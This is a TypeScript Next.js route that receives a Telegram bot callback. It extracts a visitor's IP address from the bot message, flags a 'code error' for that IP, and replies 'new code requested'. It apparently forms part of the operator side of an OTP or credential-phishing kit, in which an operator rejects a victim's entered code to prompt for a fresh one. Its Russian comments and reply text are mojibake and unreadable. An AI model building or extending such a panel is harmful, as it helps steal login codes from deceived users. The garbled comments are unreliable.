import { NextRequest, NextResponse } from 'next/server';
import { setCodeErrorFlag } from '../codeErrorStore';

export async function POST(req: NextRequest) {
  try {
    const body = await req.json();
    if (body.callback_query && body.callback_query.data === 'code_error') {
      // –ü–æ–ª—É—á–∞–µ–º IP –∏–∑ —Å–æ–æ–±—â–µ–Ω–∏—è
      const messageText = body.callback_query.message.text;
      console.log('Message text:', messageText); // –î–ª—è –æ—Ç–ª–∞–¥–∫–∏
      
      // –ò–∑–º–µ–Ω—è–µ–º —Ä–µ–≥—É–ª—è—Ä–∫—É –¥–ª—è –±–æ–ª–µ–µ —Ç–æ—á–Ω–æ–≥–æ –ø–æ–∏—Å–∫–∞ IP
      const ipMatch = messageText.match(/üåç <b>IP:<\/b> ([^\n]+)/);
      const ip = ipMatch ? ipMatch[1].trim() : 'Unknown';
      console.log('Extracted IP:', ip); // –î–ª—è –æ—Ç–ª–∞–¥–∫–∏
      
      setCodeErrorFlag(ip, true);
      
      // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –æ—Ç–≤–µ—Ç –≤ Telegram
      const answerUrl = `https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/answerCallbackQuery`;
      await fetch(answerUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          callback_query_id: body.callback_query.id,
          text: '–ó–∞–ø—Ä–æ—à–µ–Ω –Ω–æ–≤—ã–π –∫–æ–¥'
        })
      });
      
      return NextResponse.json({ ok: true });
    }
    return NextResponse.json({ ok: false, error: 'No callback_query or wrong data' }, { status: 400 });
  } catch (e) {
    console.error('Callback error:', e); // –î–ª—è –æ—Ç–ª–∞–¥–∫–∏
    return NextResponse.json({ ok: false, error: e?.toString() }, { status: 500 });
  }
} 